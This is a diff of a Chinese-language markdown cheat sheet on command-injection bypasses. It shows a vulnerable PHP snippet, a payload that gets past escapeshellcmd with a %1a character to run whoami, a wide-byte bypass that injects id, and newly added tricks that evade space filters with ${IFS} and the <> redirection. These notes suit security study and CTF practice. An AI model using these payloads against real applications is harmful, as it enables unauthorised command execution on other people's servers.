@@ -1,5 +1,5 @@
 # 绕过escapeshellcmd
-## 情景一：执行bat
+## 法一：执行bat
 ```
 <?php
     $command = 'dir '.$_POST['dir'];
@@ -14,7 +14,7 @@ payload:
 ```
 dir=../ %1a whoami
 ```
-## 情景二：宽字节注入
+## 法二：宽字节注入
 php5.2.5及之前可以通过输入多字节来绕过。现在几乎见不到了。
 ```
 escapeshellcmd("echo ".chr(0xc0).";id"); 
@@ -25,6 +25,20 @@ echo 繺;id
 ```
 从而实现 id 命令的注入。
 
+# 空格过滤
+## 法一： ${IFS}
+```
+ubuntu@VM-207-93-ubuntu:~$ cat flag
+nice day
+ubuntu@VM-207-93-ubuntu:~$ cat${IFS}flag
+nice day
+```
+
+## 法二： 重定向符<>
+```
+ubuntu@VM-207-93-ubuntu:~$ cat<>flag
+nice day
+```
 
 # Refference
 + [PHP绕过open_basedir列目录的研究](https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html)
